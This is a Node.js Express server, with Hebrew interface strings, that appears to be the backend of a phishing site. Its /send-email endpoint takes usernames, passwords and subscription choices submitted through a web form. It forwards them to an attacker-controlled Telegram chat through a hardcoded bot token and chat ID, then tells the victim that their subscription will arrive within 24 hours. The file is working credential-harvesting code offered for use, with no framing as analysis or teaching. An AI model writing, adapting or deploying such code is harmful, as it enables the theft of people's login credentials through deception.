const express = require('express');
const bodyParser = require('body-parser');

const app = express();
app.use(bodyParser.urlencoded({ extended: true }));
app.use(express.json());
app.use(express.static(__dirname));

const TELEGRAM_BOT_TOKEN = '8712536099:AAGnazkihREbhPJsGpgmAXOClVF3LSFneGg';
const TELEGRAM_CHAT_ID = '7519574690';

app.get('/', (req, res) => {
    res.sendFile(__dirname + '/index.html');
});

app.post('/send-email', async (req, res) => {
    console.log('--> התקבלה בקשת שליחה חדשה מהאתר!');
    const username = req.body.username || 'לא צויין';
    const password = req.body.password || 'לא צויין';
    const subscription = req.body.subscription || 'לא צויין';

    const message = `🔐 תזכורת פרטי התחברות חדשים מהאתר:\n\n⭐ סוג מנוי: ${subscription}\n👤 שם משתמש: ${username}\n🔑 סיסמה: ${password}`;

    try {
        const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: TELEGRAM_CHAT_ID,
                text: message
            })
        });

        const data = await response.json();
        console.log('Telegram API response:', data);

        if (data.ok) {
            res.send('המנוי יתקבל בעוד 24 שעות');
        } else {
            console.error('Telegram Error Details:', data);
            res.status(500).send('שגיאה בשליחה לטלגרם');
        }
    } catch (error) {
        console.error('Fetch Error:', error);
        res.status(500).send('שגיאת תקשורת');
    }
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`השרת פעיל בהצלחה בפורט ${PORT}`);
});
